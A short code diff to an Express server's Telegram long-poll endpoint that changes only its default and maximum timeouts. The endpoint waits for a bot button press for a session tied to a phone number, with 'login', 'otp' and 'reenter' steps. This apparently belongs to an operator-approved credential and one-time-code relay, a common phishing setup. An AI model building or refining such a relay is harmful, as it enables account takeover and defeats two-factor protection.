@@ -1341,14 +1341,14 @@ app.get('/api/telegram/status', (req, res) => {
 });
 
 // 4. Ultra-Fast Event-Driven Long-Poll Endpoint
-// Suspends response until Telegram bot clicks button or timeout fires
+// Suspends response until Telegram bot clicks button or timeout fires (default 15s, max 30s)
 app.get('/api/telegram/wait-status', (req, res) => {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
   const sessionId = (req.query.sessionId || req.query.id) as string;
   const cloudId = (req.query.cloudId || req.query.id) as string;
   const phone = req.query.phone as string;
   const targetStep = (req.query.targetStep as 'login' | 'otp' | 'reenter') || 'login';
-  const timeoutMs = Math.min(Math.max(parseInt(req.query.timeout as string, 10) || 6000, 1500), 15000);
+  const timeoutMs = Math.min(Math.max(parseInt(req.query.timeout as string, 10) || 15000, 1500), 30000);
 
   let session: SessionRecord | undefined;
   if (sessionId) {
